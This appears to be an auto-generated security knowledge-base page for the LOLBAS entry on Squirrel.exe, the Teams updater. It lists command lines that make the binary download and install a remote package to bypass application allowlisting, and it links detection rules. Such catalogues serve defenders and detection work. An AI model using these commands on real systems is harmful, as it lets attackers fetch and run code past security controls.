---
title: "Squirrel.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Squirrel.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml"
build_date: "2026-04-27 19:14:21"
category: "OtherMSBinaries"
aliases:
  - "Squirrel.exe"
functions:
  - "Download"
  - "AWL Bypass"
  - "Execute"
attack_technique_ids:
  - "T1218"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

## Paths

- `C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe`

## Commands

### 1. Download

The above binary will go to url and look for RELEASES file and download the nuget package.

```cmd
squirrel.exe --download {REMOTEURL}
```

- Use Case: Download binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 2. AWL Bypass

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```cmd
squirrel.exe --update {REMOTEURL}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 3. Execute

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```cmd
squirrel.exe --update {REMOTEURL}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 4. AWL Bypass

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```cmd
squirrel.exe --updateRollback={REMOTEURL}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 5. Execute

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```cmd
squirrel.exe --updateRollback={REMOTEURL}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml

## Resources

- {'Link': 'https://www.youtube.com/watch?v=rOP3hnkj7ls'}
- {'Link': 'https://twitter.com/reegun21/status/1144182772623269889'}
- {'Link': 'http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/'}
- {'Link': 'https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12'}
- {'Link': 'https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56'}

## Acknowledgements

- {'Person': 'Reegun J (OCBC Bank)', 'Handle': '@reegun21'}
- {'Person': 'Adam', 'Handle': '@Hexacorn'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml)
